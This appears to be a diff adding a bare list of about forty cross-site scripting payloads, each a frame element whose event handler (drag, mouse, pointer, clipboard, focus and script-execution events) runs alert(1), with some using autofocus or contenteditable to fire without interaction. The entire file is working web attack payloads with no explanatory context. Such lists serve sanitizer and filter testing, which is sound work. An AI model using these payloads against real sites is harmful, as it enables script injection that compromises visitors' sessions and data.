@@ -1,0 +1,41 @@
+<frame draggable="true" ondrag="alert(1)">test</frame>
+<frame draggable="true" ondragend="alert(1)">test</frame>
+<frame draggable="true" ondragenter="alert(1)">test</frame>
+<frame draggable="true" ondragleave="alert(1)">test</frame>
+<frame draggable="true" ondragstart="alert(1)">test</frame>
+<frame id=x tabindex=1 onactivate=alert(1)></frame>
+<frame id=x tabindex=1 onbeforeactivate=alert(1)></frame>
+<frame id=x tabindex=1 onbeforedeactivate=alert(1)></frame><input autofocus>
+<frame id=x tabindex=1 ondeactivate=alert(1)></frame><input id=y autofocus>
+<frame onafterscriptexecute=alert(1)><script>1</script>
+<frame onbeforecopy="alert(1)" contenteditable>test</frame>
+<frame onbeforecut="alert(1)" contenteditable>test</frame>
+<frame onbeforepaste="alert(1)" contenteditable>test</frame>
+<frame onbeforescriptexecute=alert(1)><script>1</script>
+<frame onblur=alert(1) tabindex=1 id=x></frame><input autofocus>
+<frame onclick="alert(1)">test</frame>
+<frame oncontextmenu="alert(1)">test</frame>
+<frame oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<frame oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<frame ondblclick="alert(1)" autofocus tabindex=1>test</frame>
+<frame onfocusout=alert(1) tabindex=1 id=x></frame><input autofocus>
+<frame onkeydown="alert(1)" contenteditable>test</frame>
+<frame onkeypress="alert(1)" contenteditable>test</frame>
+<frame onkeyup="alert(1)" contenteditable>test</frame>
+<frame onmousedown="alert(1)">test</frame>
+<frame onmouseenter="alert(1)">test</frame>
+<frame onmouseleave="alert(1)">test</frame>
+<frame onmousemove="alert(1)">test</frame>
+<frame onmouseout="alert(1)">test</frame>
+<frame onmouseover="alert(1)">test</frame>
+<frame onmouseup="alert(1)">test</frame>
+<frame onmousewheel=alert(1)>requires scrolling
+<frame onpaste="alert(1)" contenteditable>test</frame>
+<frame onpointerdown=alert(1)>XSS</frame>
+<frame onpointerenter=alert(1)>XSS</frame>
+<frame onpointerleave=alert(1)>XSS</frame>
+<frame onpointermove=alert(1)>XSS</frame>
+<frame onpointerout=alert(1)>XSS</frame>
+<frame onpointerover=alert(1)>XSS</frame>
+<frame onpointerrawupdate=alert(1)>XSS</frame>
+<frame onpointerup=alert(1)>XSS</frame>
